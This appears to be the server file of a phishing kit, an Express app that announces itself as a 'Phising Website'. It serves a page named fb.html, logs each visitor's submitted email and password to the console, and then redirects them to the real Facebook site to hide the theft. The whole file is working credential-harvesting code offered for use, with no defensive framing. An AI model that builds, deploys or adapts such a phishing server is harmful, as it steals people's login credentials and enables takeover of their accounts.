const express = 
require("express");

const https 
= require("https");

const bodyParser 
= require("body-parser");

const { ServerResponse } 
= require("http");

const app = express();

app.use(bodyParser.urlencoded({extended: true}))

console.log(`
Your Phising Website is ready and it is running at localhost:3000\n\n
`);

app.get("/", 
    function(req, res)
    {
    res.sendFile(__dirname + "/fb.html")
}); 

app.post("/", function(req, res)
{
    console.log("\nPost Request Recieved");
        const email = req.body.email;
        const new_password = req.body.password;
        const re_password = req.body.repassword;
        console.log(email);
        console.log(new_password);
        console.log(re_password);
        res.redirect('https://www.facebook.com');

        
    })
app.listen(3000, () => console.log("Server Started"))